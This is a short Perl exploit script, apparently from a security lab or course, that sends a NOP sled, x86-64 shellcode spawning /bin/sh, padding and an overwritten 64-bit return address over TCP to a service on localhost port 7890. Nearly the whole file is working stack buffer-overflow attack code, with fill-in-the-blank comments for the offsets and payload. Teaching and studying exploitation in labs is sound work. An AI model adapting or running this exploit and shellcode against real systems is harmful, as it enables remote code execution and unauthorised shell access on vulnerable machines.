use strict;
use Socket;
####
my $nopsled="\x90" x 60; # fill in the correct length in decimal number of bytes
#
my $payload="\xeb\x0e\x5f\x48\x31\xc0\xb0\x3b\x48\x31\xf6\x48\x31\xd2\x0f\x05\xe8\xed\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x00\xef"; # fill in the payload in hex
# eb0e5f4831c0b03b4831f64831d20f05e8edffffff2f62696e2f736800ef
#
my $buffstuff="\x90" x 62; # fill in the correct length in decimal number bytes
#
my $offset_rip = "\x00\xe5\xff\xff\xff\x7f\x00\x00"; # fill in the 8-byte rip address in hex (little-endian)
# 16bits because 64bit architecture
# 0x00007fffffffe4a0 is \xa0\xe4\xff\xff\xff\x7f\x00\x00 (little-endian)
# 0x00007fffffffe500 is \x00\xe5\xff\xff\xff\x7f\x00\x00 (little-endian)
####
my $target = '127.0.0.1';
my $targetport = 7890;
my $tcpproto = getprotobyname('tcp');
my $binaddr = inet_aton($target);
my $exactaddr = sockaddr_in($targetport, $binaddr);
print "Initializing and Socket Setting Up..\n";
socket(SOCKET, PF_INET, SOCK_STREAM, $tcpproto) or die "socket: $!";
print "\nMaking a Connection To the Target";
connect(SOCKET, $exactaddr) or die "connect: $!";
print "\nExplotiing The Target Machine";
print SOCKET $nopsled.$payload.$buffstuff.$offset_rip."\n";
print "\nExploit Completed";
print "\nInitializing the Connection to The Opened Port by the Payload";
close SOCKET or die "close: $!";
